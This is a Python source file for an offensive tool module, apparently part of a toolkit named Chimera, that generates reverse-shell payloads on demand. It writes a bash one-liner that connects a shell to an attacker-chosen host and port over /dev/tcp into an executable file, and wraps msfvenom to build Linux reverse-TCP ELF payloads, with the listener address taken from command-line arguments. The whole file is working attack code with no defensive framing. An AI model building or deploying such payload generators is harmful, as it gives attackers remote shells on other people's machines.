import subprocess
import os
import sys

class PayloadFactory:
    """
    Chimera Agent 15: Payload Factory
    Location: ~/chimera/agents/15_Payload_Factory/src/main.py
    Purpose: Generate stagers and reverse shells on demand.
    """
    def __init__(self, lhost="127.0.0.1", lport="4444"):
        self.lhost = lhost
        self.lport = lport
        # Set loot path relative to this script
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.loot_dir = os.path.join(base_dir, "loot")

    def generate_bash_rev(self):
        """Generates a simple one-liner bash reverse shell."""
        print(f"[*] Agent 15: Generating Bash Reverse Shell ({self.lhost}:{self.lport})")
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        filename = "rev_shell.sh"
        path = os.path.join(self.loot_dir, filename)
        
        with open(path, "w") as f:
            f.write(f"#!/bin/bash\n{payload}")
        
        os.chmod(path, 0o755)
        print(f"[+] Agent 15: Payload saved to {path}")
        return path

    def generate_msf_venom(self, p_type="linux/x64/shell_reverse_tcp", format="elf"):
        """Wraps msfvenom for more 'professional' payloads."""
        print(f"[*] Agent 15: Invoking msfvenom for {p_type}...")
        filename = f"payload.{format}"
        path = os.path.join(self.loot_dir, filename)
        
        cmd = [
            "msfvenom", "-p", p_type,
            f"LHOST={self.lhost}", f"LPORT={self.lport}",
            "-f", format, "-o", path
        ]
        
        try:
            # Check if msfvenom is actually installed (should be on Kali)
            subprocess.run(cmd, check=True, capture_output=True)
            print(f"[!!!] Agent 15: MSF Payload generated at {path}")
            return path
        except subprocess.CalledProcessError as e:
            print(f"[!] Agent 15 Error: msfvenom failed. {e.stderr.decode()}")
            return None

    def run(self):
        print("--- Agent 15: Factory Online ---")
        # For testing, we'll generate a basic bash script
        self.generate_bash_rev()
        # If you're on Kali, uncomment this to test msfvenom
        # self.generate_msf_venom() 

if __name__ == "__main__":
    # If the Commander passes arguments: lhost lport
    lh = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    lp = sys.argv[2] if len(sys.argv) > 2 else "4444"
    
    factory = PayloadFactory(lhost=lh, lport=lp)
    factory.run()
